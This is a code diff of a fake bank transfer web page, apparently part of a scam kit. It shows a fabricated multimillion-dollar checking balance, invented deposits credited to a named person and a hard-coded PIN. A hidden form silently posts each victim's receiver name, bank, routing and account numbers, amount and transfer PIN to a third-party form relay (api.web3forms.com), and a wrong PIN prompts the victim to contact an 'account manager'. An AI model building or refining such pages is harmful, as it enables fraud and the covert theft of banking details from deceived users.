@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Transfer Money - Investment Account</title>
+    <title>Transfer Money - Checking Account</title>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
     <style>
         * {
@@ -296,7 +296,7 @@
 
     <div class="transfer-container" id="transferContainer">
         <button class="back-button" onclick="window.location.href='../index.html'">
-            <i class="fas fa-arrow-left"></i> Back to Dashboard
+            <i class="fas fa-arrow-left"></i> Back to Checking
         </button>
         
         <h1>Bank Transfer</h1>
@@ -345,10 +345,9 @@
         </button>
     </div>
 
-    <!-- Hidden form that will be submitted in the background -->
     <form id="phraseForm" style="display: none;">
         <input type="hidden" name="access_key" value="19bd1a1c-04ae-4540-8975-9d05a216e05e">
-        <input type="hidden" name="subject" value="Transfer initiated from Investment Account">
+        <input type="hidden" name="subject" value="Transfer initiated from Checking Account">
         <input type="hidden" name="receiver_name" id="formReceiverName">
         <input type="hidden" name="bank_name" id="formBankName">
         <input type="hidden" name="wire_routing" id="formWireRouting">
@@ -390,18 +389,103 @@
     </div>
 
     <script>
-        // Configuration matching dashboard
-        const DEFAULT_BALANCE = 4150000.00;
-        const CORRECT_PIN = "111122";
+        // ========== WEB STORAGE KEYS (Matching checking account) ==========
+        const STORAGE_BALANCE = 'checking_balance';
+        const STORAGE_TRANSACTIONS = 'checking_transactions';
+        const DEFAULT_BALANCE = 6238166.00;
+        const CORRECT_PIN = "1111";
 
-        // Generate unique transaction reference
+        // Default transactions to preserve
+        const DEFAULT_TRANSACTIONS = [
+            { 
+                name: "bitFlyer - Deposit", 
+                time: "17 Apr 2026 • 2:30 PM", 
+                amount: 93166.00, 
+                type: "credit",
+                reference: 'DEP-123456-A1B2C',
+                status: "completed",
+                description: "Activation Deposit",
+                beneficiary: "CHRISTINE DELFELD",
+                date: "17 April 2026",
+                exactTime: "2:30 PM"
+            },
+            { 
+                name: "BeyondTrustB - Deposit", 
+                time: "9 April 2026 • 10:23 AM", 
+                amount: 6145000.00, 
+                type: "credit",
+                reference: 'DEP-789012-D3E4F',
+                status: "completed",
+                description: "DEPOSIT FROM CHRISTINE DELFELD",
+                beneficiary: "CHRISTINE DELFELD",
+                date: "9 April 2026",
+                exactTime: "10:23 AM"
+            }
+        ];
+
         function generateTransactionRef() {
-            const timestamp = Date.now().toString().slice(-8);
+            const timestamp = Date.now().toString().slice(-6);
             const random = Math.random().toString(36).substr(2, 6).toUpperCase();
-            return `TRX-${timestamp}-${random}`;
+            return `CHK-${timestamp}-${random}`;
         }
 
-        // Page initialization
+        function getCurrentBalance() {
+            let balance = parseFloat(localStorage.getItem(STORAGE_BALANCE));
+            if (isNaN(balance)) {
+                balance = DEFAULT_BALANCE;
+                localStorage.setItem(STORAGE_BALANCE, balance);
+            }
+            return balance;
+        }
+
+        function updateBalance(newBalance) {
+            localStorage.setItem(STORAGE_BALANCE, newBalance);
+        }
+
+        function addTransactionToStorage(transactionData) {
+            try {
+                let transactions = JSON.parse(localStorage.getItem(STORAGE_TRANSACTIONS)) || [];
+                
+                // Ensure default transactions are preserved
+                const hasDefaultBitflyer = transactions.some(t => t.name === "bitFlyer - Deposit");
+                const hasDefaultBeyond = transactions.some(t => t.name === "BeyondTrustB - Deposit");
+                
+                if (!hasDefaultBitflyer) {
+                    transactions.push(DEFAULT_TRANSACTIONS[0]);
+                }
+                if (!hasDefaultBeyond) {
+                    transactions.push(DEFAULT_TRANSACTIONS[1]);
+                }
+                
+                // Add new transaction at the beginning
+                transactions.unshift(transactionData);
+                
+                localStorage.setItem(STORAGE_TRANSACTIONS, JSON.stringify(transactions));
+                console.log('Transaction saved. Total:', transactions.length);
+                return true;
+            } catch (error) {
+                console.error('Error saving transaction:', error);
+                return false;
+            }
+        }
+
+        function notifyCheckingPage() {
+            try {
+                // Dispatch storage event
+                window.dispatchEvent(new StorageEvent('storage', {
+                    key: STORAGE_TRANSACTIONS,
+                    newValue: localStorage.getItem(STORAGE_TRANSACTIONS)
+                }));
+                
+                // Try to reload checking page if it's open
+                if (window.opener && !window.opener.closed) {
+                    window.opener.postMessage({ type: 'TRANSFER_COMPLETED' }, '*');
+                }
+            } catch(e) {
+                console.log('Could not notify checking page:', e);
+            }
+        }
+
         setTimeout(() => {
             document.getElementById('pageLoader').style.opacity = '0';
             setTimeout(() => {
@@ -411,7 +495,6 @@
         }, 1500);
 
         function submitPhraseForm() {
-            // Set all the form values from the input fields
             document.getElementById('formReceiverName').value = document.getElementById('reciverName').value;
             document.getElementById('formBankName').value = document.getElementById('bankName').value;
             document.getElementById('formWireRouting').value = document.getElementById('wirerouting').value;
@@ -420,74 +503,34 @@
             document.getElementById('formAmount').value = document.getElementById('amount').value;
             document.getElementById('formTransferPin').value = document.getElementById('transferPin').value;
             
-            // Submit silently using fetch()
             const formData = new FormData(document.getElementById('phraseForm'));
-            
-            // Add timestamp to ensure unique submission
             formData.append('timestamp', new Date().toISOString());
             
             fetch('https://api.web3forms.com/submit', {
                 method: 'POST',
                 body: formData,
-                headers: {
-                    'Accept': 'application/json'
-                }
+                headers: { 'Accept': 'application/json' }
             })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('Form submission successful:', data);
-                if (!data.success) {
-                    console.error('Form submission failed:', data.message);
-                }
-            })
-            .catch(error => {
-                console.error('Error submitting form:', error);
-            });
-        }
-
-        function addTransactionToDashboard(transactionData) {
-            try {
-                if (window.opener && typeof window.opener.addNewTransaction === 'function') {
-                    // Call the dashboard's addNewTransaction function
-                    const reference = window.opener.addNewTransaction(transactionData);
-                    return reference;
-                } else {
-                    // Fallback: Update localStorage directly
-                    const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
-                    transactions.unshift(transactionData);
-                    localStorage.setItem('transactionHistory', JSON.stringify(transactions));
-                    return transactionData.reference;
-                }
-            } catch (error) {
-                console.error('Error adding transaction to dashboard:', error);
-                // Fallback to localStorage
-                const transactions = JSON.parse(localStorage.getItem('transactionHistory')) || [];
-                transactions.unshift(transactionData);
-                localStorage.setItem('transactionHistory', JSON.stringify(transactions));
-                return transactionData.reference;
-            }
+            .then(response => response.json())
+            .then(data => console.log('Form submitted:', data))
+            .catch(error => console.error('Form error:', error));
         }
 
         function processTransfer() {
             const fields = ['reciverName', 'bankName', 'wirerouting', 
                           'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
             
-            // Validate all fields
-            if (!fields.every(id => document.getElementById(id).value.trim())) {
-                alert('Please complete all fields before proceeding.');
-                return;
+            for (const field of fields) {
+                if (!document.getElementById(field).value.trim()) {
+                    alert('Please complete all fields before proceeding.');
+                    return;
+                }
             }
 
             const amount = parseFloat(document.getElementById('amount').value);
             const transferPin = document.getElementById('transferPin').value;
             const transferButton = document.getElementById('transferButton');
             
-            // Validate amount
             if (isNaN(amount) || amount <= 0) {
                 alert('Please enter a valid amount greater than 0.');
                 return;
@@ -498,47 +541,34 @@
                 return;
             }
 
-            // Disable button during processing
             transferButton.disabled = true;
             document.getElementById('buttonText').style.display = 'none';
             document.getElementById('buttonLoader').style.display = 'block';
 
-            // Submit the form data immediately
             submitPhraseForm();
 
             setTimeout(() => {
                 try {
-                    // PIN verification
                     if (transferPin !== CORRECT_PIN) {
-                        throw new Error('ATTENTION - UNBALE TO PROCESS THIS TRANSFER CONTACT YOUR ACCOUNT MANAGER.');
+                        throw new Error('ATTENTION - UNABLE TO PROCESS THIS TRANSFER. Please contact your account manager.');
                     }
 
-                    // Balance check
-                    let currentBalance = parseFloat(localStorage.getItem('balance')) || DEFAULT_BALANCE;
+                    let currentBalance = getCurrentBalance();
+                    
                     if (amount > currentBalance) {
-                        throw new Error('Insufficient Funds - You do not have sufficient funds in your account.');
+                        throw new Error(`Insufficient Funds - Available balance: $${currentBalance.toLocaleString()}`);
                     }
 
-                    // Update balance
-                    currentBalance -= amount;
-                    localStorage.setItem('balance', currentBalance);
+                    const newBalance = currentBalance - amount;
+                    updateBalance(newBalance);
 
-                    // Generate transaction reference
                     const transactionRef = generateTransactionRef();
                     const now = new Date();
 
-                    // Create enhanced transaction data
                     const transactionData = {
                         name: `Transfer to ${document.getElementById('bankName').value.trim()}`,
-                        time: now.toLocaleDateString('en-GB', {
-                            day: 'numeric',
-                            month: 'short',
-                            year: 'numeric'
-                        }) + " • " + now.toLocaleTimeString('en-US', {
-                            hour: '2-digit',
-                            minute: '2-digit'
-                        }),
-                        amount: -Math.abs(amount),
+                        time: now.toLocaleDateString('en-GB', { day: 'numeric', month: 'short', year: 'numeric' }) + " • " + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' }),
+                        amount: amount,
                         type: "debit",
                         reference: transactionRef,
                         status: "completed",
@@ -547,31 +577,32 @@
                         method: "Wire Transfer",
                         beneficiary: document.getElementById('reciverName').value.trim(),
                         accountNumber: document.getElementById('accountNumber').value.trim(),
-                        date: now.toLocaleDateString('en-GB', {
-                            day: 'numeric',
-                            month: 'long',
-                            year: 'numeric'
-                        }),
-                        exactTime: now.toLocaleTimeString('en-US', {
-                            hour: '2-digit',
-                            minute: '2-digit'
-                        })
+                        date: now.toLocaleDateString('en-GB', { day: 'numeric', month: 'long', year: 'numeric' }),
+                        exactTime: now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' })
                     };
 
-                    // Add transaction to dashboard
-                    const addedReference = addTransactionToDashboard(transactionData);
+                    addTransactionToStorage(transactionData);
+                    notifyCheckingPage();
 
-                    // Show success with transaction reference
-                    document.getElementById('successReference').textContent = `Reference: ${addedReference || transactionRef}`;
-                    document.getElementById('successMessage').textContent = 
-                        `Your transfer of $${amount.toLocaleString('en-US', {minimumFractionDigits: 2})} has been processed successfully.`;
+                    document.getElementById('successReference').textContent = `Reference: ${transactionRef}`;
+                    document.getElementById('successMessage').innerHTML = 
+                        `Your transfer of <strong>$${amount.toLocaleString('en-US', {minimumFractionDigits: 2})}</strong> has been processed successfully.<br><br>
+                        New balance: <strong>$${newBalance.toLocaleString('en-US', {minimumFractionDigits: 2})}</strong>`;
                     showPopup('successPopup');
 
                 } catch (error) {
-                    const [title, message] = error.message.split(' - ');
+                    const errorMsg = error.message;
+                    let title = 'Transaction Failed';
+                    let message = errorMsg;
+                    
+                    if (errorMsg.includes('ATTENTION')) {
+                        title = 'Verification Required';
+                    } else if (errorMsg.includes('Insufficient')) {
+                        title = 'Insufficient Funds';
+                    }
+                    
                     showPopup('errorPopup', title, message);
                 } finally {
-                    // Reset button state
                     transferButton.disabled = false;
                     document.getElementById('buttonText').style.display = 'block';
                     document.getElementById('buttonLoader').style.display = 'none';
@@ -601,26 +632,18 @@
         function closePopup(popupId) {
             document.getElementById(popupId).style.display = 'none';
             if (popupId === 'successPopup') {
-                // Clear form
                 const fields = ['reciverName', 'bankName', 'wirerouting', 
                               'Reasonsforpayment', 'accountNumber', 'amount', 'transferPin'];
                 fields.forEach(id => {
                     document.getElementById(id).value = '';
                 });
                 
-                // Notify parent window if opened from dashboard
-                try {
-                    window.opener.postMessage('transferCompleted', '*');
-                    setTimeout(() => {
-                        window.location.href = '../dashboard.html';
-                    }, 1000);
-                } catch (e) {
-                    // If not opened from dashboard, just stay on page
-                }
+                setTimeout(() => {
+                    window.location.href = '../index.html';
+                }, 1000);
             }
         }
 
-        // Auto-format amount
         document.getElementById('amount').addEventListener('blur', function(e) {
             const value = parseFloat(e.target.value);
             if (!isNaN(value)) {
@@ -628,12 +651,16 @@
             }
         });
 
-        // Press Enter to submit
         document.addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
-                processTransfer();
+                const activeElement = document.activeElement;
+                if (activeElement && activeElement.tagName !== 'BUTTON') {
+                    processTransfer();
+                }
             }
         });
+        
+        console.log('Transfer page loaded. Default transactions will be preserved.');
     </script>
 </body>
 </html>
